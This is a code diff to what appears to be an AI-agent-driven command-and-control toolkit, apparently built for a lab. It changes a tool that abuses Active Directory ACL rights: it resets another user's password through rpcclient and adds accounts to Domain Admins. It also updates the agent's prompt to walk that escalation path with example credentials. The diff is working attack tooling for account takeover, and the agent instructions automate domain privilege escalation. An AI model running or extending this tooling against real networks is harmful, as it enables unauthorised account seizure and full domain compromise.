@@ -459,7 +459,7 @@ def c2_spray(agent_id: str, target_ip: str) -> str:
 
 
 @tool
-def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str = "", altpass: str = "") -> str:
+def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str = "", altpass: str = "", dc_ip: str = "") -> str:
     """
     Exploit an ACL misconfiguration.
     operation choices:
@@ -470,7 +470,8 @@ def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str
       writeowner          <target> <new_owner>
     operation_args: positional arguments as a space-separated string.
     altuser/altpass: credentials of the account that holds the ACL right (required for forcechangepassword).
-    Example: operation='forcechangepassword', operation_args='svc_backup NewP@ss!', altuser='helpdesk', altpass='PfeLab@2026!'
+    dc_ip: DC IP address (optional — skips hosts DB lookup; always provide this when known).
+    Example: operation='forcechangepassword', operation_args='svc_backup NewP@ss!', altuser='helpdesk', altpass='PfeLab@2026!', dc_ip='10.0.2.8'
     Blocks up to 60 seconds.
     """
     import subprocess as _sp
@@ -487,13 +488,15 @@ def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str
         if len(args) < 2:
             return "[error] forcechangepassword: operation_args must be '<user> <newpassword>'"
         target_user, newpass = args[0], args[1]
-        hosts = _get("/hosts")
-        dc_ip = next(
-            (h["ip"] for h in hosts if isinstance(hosts, list) and "389" in h.get("open_ports", "").split(",")),
-            None
-        )
-        if not dc_ip:
-            return "[error] DC not found in hosts DB — run recon first"
+        resolved_dc = dc_ip.strip() if dc_ip.strip() else None
+        if not resolved_dc:
+            hosts = _get("/hosts")
+            resolved_dc = next(
+                (h["ip"] for h in hosts if isinstance(hosts, list) and "389" in h.get("open_ports", "").split(",")),
+                None
+            )
+        if not resolved_dc:
+            return "[error] DC not found — pass dc_ip explicitly or run recon first"
         agents = _get("/agents")
         domain = "ICCN.local"
         if isinstance(agents, list):
@@ -502,9 +505,9 @@ def c2_aclabuse(agent_id: str, operation: str, operation_args: str, altuser: str
                 if "." in hn:
                     domain = ".".join(hn.split(".")[1:])
                     break
-        cmd = ["rpcclient", f"-U{domain}/{altuser}%{altpass}", dc_ip,
+        cmd = ["rpcclient", f"-U{domain}/{altuser}%{altpass}", resolved_dc,
                "-c", f"setuserinfo2 {target_user} 23 '{newpass}'"]
-        print(f"  [aclabuse] forcechangepassword via rpcclient → {dc_ip} as {altuser}")
+        print(f"  [aclabuse] forcechangepassword via rpcclient → {resolved_dc} as {altuser}")
         try:
             result = _sp.run(cmd, capture_output=True, text=True, timeout=15)
             combined = (result.stdout + result.stderr).strip()
@@ -732,9 +735,13 @@ Execute BOTH paths A and B whenever matches are found:
     Example path: "jsmith --[ForceChangePassword]--> svc_backup --[AddMember]--> Domain Admins"
     And you have jsmith credentials:
       Step 1: c2_ask_human("Ready to ForceChangePassword on svc_backup using jsmith. Proceed?")
-              c2_aclabuse(agent_id, "forcechangepassword", "svc_backup NewP@ssw0rd!")
+              c2_aclabuse(agent_id, "forcechangepassword", "svc_backup NewP@ssw0rd!", altuser="jsmith", altpass="<pass>", dc_ip="<dc_ip>")
       Step 2: c2_ask_human("Ready to AddMember: add svc_backup to Domain Admins. Proceed?")
-              c2_aclabuse(agent_id, "addmember", "Domain Admins svc_backup")
+              c2_aclabuse(agent_id, "addmember", "Domain Admins svc_backup", dc_ip="<dc_ip>")
+
+    IMPORTANT: Always pass dc_ip to c2_aclabuse when the DC IP is known. Never skip it — the hosts DB
+    may be empty and dc_ip is the only reliable way to reach the DC. If the operator told you the DC IP,
+    use it directly instead of running recon.
 
   ── FALLBACK: CREDENTIAL SPRAY ──────────────────────────────
   If no credential matches found in paths A or B:
